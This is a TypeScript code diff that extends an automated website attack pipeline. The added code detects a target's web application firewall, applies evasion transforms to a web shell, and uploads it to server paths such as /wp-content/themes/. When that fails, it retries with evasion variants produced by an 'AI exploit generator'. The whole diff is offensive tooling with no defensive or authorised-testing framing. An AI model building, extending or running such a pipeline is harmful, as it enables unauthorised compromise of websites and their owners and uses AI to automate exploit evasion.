@@ -40,7 +40,9 @@ import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimal
 import { runWpVulnScan, executeExploit, type WpScanResult, type WpVulnerability } from "./wp-vuln-scanner";
 import { runCmsVulnScan, executeCmsExploit, detectCms, type CmsScanResult, type CmsVulnerability } from "./cms-vuln-scanner";
 import { matchPluginsAgainstDb, lookupCves } from "./cve-auto-updater";
-import { generateAndExecuteExploit, generateExploitPayload, generateWafEvasionVariants, type ExploitPayload } from "./ai-exploit-generator";
+import { generateAndExecuteExploit, generateExploitPayload, generateWafEvasionVariants, type ExploitPayload, type WafEvasionVariant } from "./ai-exploit-generator";
+import { detectWaf, getEvasionStrategy, applyEvasionToPayload, type WafDetectionResult, type EvasionStrategy } from "./waf-detector";
+import { trackExploitAttempt, trackWafDetection, extractDomain } from "./exploit-tracker";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -172,6 +174,9 @@ export interface PipelineResult {
   dbCveMatches?: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> | null;
   // AI-generated exploit payloads used during the attack
   aiExploits?: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> | null;
+  // WAF Detection & Evasion
+  wafDetection?: WafDetectionResult | null;
+  evasionStrategy?: EvasionStrategy | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1026,6 +1031,74 @@ export async function runUnifiedAttackPipeline(
       detail: `⚠️ Deep scan ล้มเหลว: ${error.message} — ใช้ข้อมูลจาก pre-screen`,
       progress: 35,
     });
+  }
+
+  // ─── Phase 2.4: WAF Detection + Auto-Evasion Strategy ───
+  let wafDetectionResult: WafDetectionResult | null = null;
+  let evasionStrategy: EvasionStrategy | null = null;
+
+  if (!shouldStop('recon')) {
+    try {
+      loggedOnEvent({
+        phase: "recon",
+        step: "waf_detection",
+        detail: "🛡️ Phase 2.4: WAF Detection — Header fingerprinting, cookie analysis, probe-based detection...",
+        progress: 33,
+      });
+
+      wafDetectionResult = await Promise.race([
+        detectWaf(config.targetUrl),
+        new Promise<WafDetectionResult>((_, reject) => setTimeout(() => reject(new Error("WAF detection timeout")), 60000)),
+      ]);
+
+      if (wafDetectionResult.detected) {
+        evasionStrategy = getEvasionStrategy(wafDetectionResult);
+        aiDecisions.push(`🛡️ WAF Detected: ${wafDetectionResult.wafName} (${wafDetectionResult.confidence} confidence, ${wafDetectionResult.strength} strength)`);
+        aiDecisions.push(`🛡️ Evasion Strategy: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}`);
+
+        // Track WAF detection in database
+        trackWafDetection({
+          targetDomain: extractDomain(config.targetUrl),
+          targetUrl: config.targetUrl,
+          wafName: wafDetectionResult.wafName || null,
+          wafVendor: wafDetectionResult.wafVendor || null,
+          confidence: wafDetectionResult.confidence || null,
+          strength: wafDetectionResult.strength || null,
+          blocksXss: wafDetectionResult.blockBehavior?.blocksXss || false,
+          blocksSqli: wafDetectionResult.blockBehavior?.blocksSqli || false,
+          blocksFileUpload: wafDetectionResult.blockBehavior?.blocksFileUpload || false,
+          blocksPathTraversal: wafDetectionResult.blockBehavior?.blocksPathTraversal || false,
+          blocksCommandInjection: wafDetectionResult.blockBehavior?.blocksCommandInjection || false,
+          blocksRateLimit: wafDetectionResult.blockBehavior?.blockRateLimit || false,
+          detectionMethods: wafDetectionResult.detectionMethods || [],
+          evasionRecommendations: evasionStrategy.primaryTechniques || [],
+          pipelineRunId: null,
+        }).catch(() => {});
+
+        loggedOnEvent({
+          phase: "recon",
+          step: "waf_detected",
+          detail: `🛡️ WAF Detected: ${wafDetectionResult.wafName} (${wafDetectionResult.wafVendor}) — Confidence: ${wafDetectionResult.confidence}, Strength: ${wafDetectionResult.strength}. Blocks: XSS=${wafDetectionResult.blockBehavior.blocksXss}, SQLi=${wafDetectionResult.blockBehavior.blocksSqli}, Upload=${wafDetectionResult.blockBehavior.blocksFileUpload}. Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}`,
+          progress: 34,
+        });
+      } else {
+        aiDecisions.push("🛡️ No WAF detected — proceeding with standard attack methods");
+        loggedOnEvent({
+          phase: "recon",
+          step: "no_waf",
+          detail: "🛡️ No WAF detected — standard attack methods will be used",
+          progress: 34,
+        });
+      }
+    } catch (err: any) {
+      aiDecisions.push(`🛡️ WAF detection failed: ${err.message} — proceeding without evasion`);
+      loggedOnEvent({
+        phase: "recon",
+        step: "waf_error",
+        detail: `🛡️ WAF detection error: ${err.message}`,
+        progress: 34,
+      });
+    }
   }
 
   // ─── Phase 2.5: Recon — Config Exploitation + DNS/Origin IP Discovery ───
@@ -2069,13 +2142,15 @@ export async function runUnifiedAttackPipeline(
     const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
     const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;
 
-    // 4.5a: WAF Bypass uploads
+    // 4.5a: WAF Bypass uploads (enhanced with waf-detector evasion strategy)
     if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !hasSuccessfulRedirect()) {
       try {
+        const wafName = wafDetectionResult?.detected ? wafDetectionResult.wafName : "Unknown";
+        const evasionHint = evasionStrategy ? ` — Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}` : "";
         loggedOnEvent({
           phase: "waf_bypass",
           step: "start",
-          detail: `🛡️ Phase 4.5a: WAF Bypass — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
+          detail: `🛡️ Phase 4.5a: WAF Bypass (${wafName})${evasionHint} — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
           progress: 82,
         });
 
@@ -2086,12 +2161,27 @@ export async function runUnifiedAttackPipeline(
           "/wp-content/themes/", "/tmp/", "/media/",
         ];
 
+        // If WAF was detected, apply evasion to shell content before upload
+        let evasionShellContent = shellContent;
+        if (wafDetectionResult?.detected && evasionStrategy) {
+          try {
+            const evasionPayload = applyEvasionToPayload(shellContent, bestShell.filename, evasionStrategy);
+            if (evasionPayload.modifiedPayloads.length > 0) {
+              evasionShellContent = evasionPayload.modifiedPayloads[0].payload;
+              const techniques = evasionPayload.modifiedPayloads.map(p => p.technique);
+              aiDecisions.push(`🛡️ Applied ${techniques.length} evasion techniques: ${techniques.slice(0, 5).join(", ")}`);
+            }
+          } catch (evasionErr: any) {
+            aiDecisions.push(`🛡️ Evasion transform failed: ${evasionErr.message} — using original payload`);
+          }
+        }
+
         // Run WAF bypass with ALL paths at once (engine rotates internally)
         wafBypassResults = await Promise.race([
           runWafBypass({
             targetUrl: targetForAdvanced,
             uploadPaths: uploadPaths,
-            fileContent: shellContent,
+            fileContent: evasionShellContent,
             originalFilename: bestShell.filename,
             timeout: config.timeoutPerMethod || 30000,
             onProgress: (method: string, detail: string) => {
@@ -2105,6 +2195,57 @@ export async function runUnifiedAttackPipeline(
           }),
           new Promise<WafBypassResult[]>((_, reject) => setTimeout(() => reject(new Error("WAF bypass timeout")), 120000)),
         ]);
+
+        // If WAF bypass failed and we have evasion, try AI-generated WAF evasion variants
+        const wafInitialSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
+        if (!wafInitialSuccess && wafDetectionResult?.detected && evasionStrategy) {
+          try {
+            aiDecisions.push(`🛡️ WAF bypass failed — generating AI evasion variants for ${wafDetectionResult.wafName}...`);
+            loggedOnEvent({
+              phase: "waf_bypass",
+              step: "ai_evasion",
+              detail: `🤖 Generating AI WAF evasion variants for ${wafDetectionResult.wafName}...`,
+              progress: 85,
+            });
+
+            const aiVariants = await Promise.race([
+              generateWafEvasionVariants(
+                shellContent,
+                "file_upload",
+                wafDetectionResult.wafName || "generic",
+              ),
+              new Promise<WafEvasionVariant[]>((_, reject) => setTimeout(() => reject(new Error("AI evasion timeout")), 45000)),
+            ]) as WafEvasionVariant[];
+
+            // Try each AI variant
+            for (const variant of aiVariants.slice(0, 5)) {
+              const variantResults = await runWafBypass({
+                targetUrl: targetForAdvanced,
+                uploadPaths: uploadPaths.slice(0, 3),
+                fileContent: variant.payload,
+                originalFilename: bestShell.filename,
+                timeout: 15000,
+                onProgress: (method: string, detail: string) => {
+                  loggedOnEvent({
+                    phase: "waf_bypass",
+                    step: `ai_variant_${variant.technique}`,
+                    detail: `🤖 AI Evasion (${variant.technique}): ${detail}`,
+                    progress: 86,
+                  });
+                },
+              });
+
+              const variantSuccess = variantResults.find(r => r.success && r.fileUrl);
+              if (variantSuccess) {
+                aiDecisions.push(`✅ AI WAF evasion success: ${variant.technique}`);
+                wafBypassResults.push(...variantResults);
+                break;
+              }
+            }
+          } catch (aiEvasionErr: any) {
+            aiDecisions.push(`🛡️ AI evasion generation failed: ${aiEvasionErr.message}`);
+          }
+        }
 
         const wafSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
         if (wafSuccess && wafSuccess.fileUrl) {
